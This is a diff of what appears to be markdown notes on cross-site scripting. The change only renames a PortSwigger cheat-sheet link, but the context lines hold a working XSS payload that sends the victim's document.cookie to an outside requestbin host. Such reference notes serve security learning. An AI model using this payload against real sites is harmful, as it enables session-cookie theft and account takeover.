@@ -6,7 +6,7 @@ Exemple of XSS :
 <img src="#" onerror="document.location='http://requestbin.fullcontact.com/168r30u1?c' + document.cookie">
 ```
 
-* [Cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+* [XSS Cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 
 * Filter Evasion
 
